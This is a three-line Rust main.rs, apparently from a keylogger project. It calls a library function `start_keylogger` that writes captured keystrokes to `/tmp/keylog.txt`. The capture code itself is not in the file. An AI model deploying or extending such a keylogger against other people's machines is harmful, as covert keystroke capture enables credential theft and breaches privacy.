mod lib;

fn main() {
    let _res = lib::start_keylogger("/tmp/keylog.txt".to_string(), 3);
}

